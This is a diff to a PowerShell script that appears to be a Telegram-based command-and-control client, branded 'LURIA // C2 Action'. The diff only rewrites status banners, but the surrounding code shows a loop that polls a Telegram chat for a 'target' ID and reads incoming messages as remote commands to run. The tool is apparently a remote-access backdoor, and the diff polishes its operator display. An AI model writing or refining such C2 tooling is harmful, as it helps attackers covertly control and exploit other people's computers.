@@ -14,7 +14,7 @@ Write-Host '  \/_/ /_/     \/_____/     \/_/  \/_/     \/_____/      \/_/      \
 Write-Host ''
 Write-Host '====================================================================================================================================' -ForegroundColor Green
 Write-Host ''
-Write-Host '[*] Status: Establishing Connection...' -ForegroundColor Yellow
+Write-Host '[*] Status: Establishing Secure Tunnel with Telegram...' -ForegroundColor Yellow
 
 $chatId =$null
 while (-not $chatId) {
@@ -27,8 +27,8 @@ while (-not $chatId) {
     if (-not $chatId) { Start-Sleep 2 }
 }
 
-Write-Host "[+] Connection Established - Chat ID: $chatId" -ForegroundColor Green
-Write-Host "[*] Awaiting remote commands..." -ForegroundColor DarkGray
+Write-Host "[+] Tunnel Established Successfully! Target Chat ID: $chatId" -ForegroundColor Green
+Write-Host "[*] Awaiting remote commands via Telegram..." -ForegroundColor DarkGray
 Write-Host ""
 
 $lastUpdateId = 0
@@ -48,7 +48,7 @@ while ($true) {
                     $cmd =$msgText.Substring(1)
                     
                     # Command Execution Header Box
-                    Write-Host "┌──([ REMOTE COMMAND ])────────────────────────────────────────────────────────" -ForegroundColor DarkCyan
+                    Write-Host "┌──([ LURIA // C2 Action ])────────────────────────────────────────────────────────" -ForegroundColor DarkCyan
                     Write-Host "├─ Command : $cmd" -ForegroundColor Cyan
                     Write-Host "└──────────────────────────────────────────────────────────────────────────────────" -ForegroundColor DarkCyan
                     
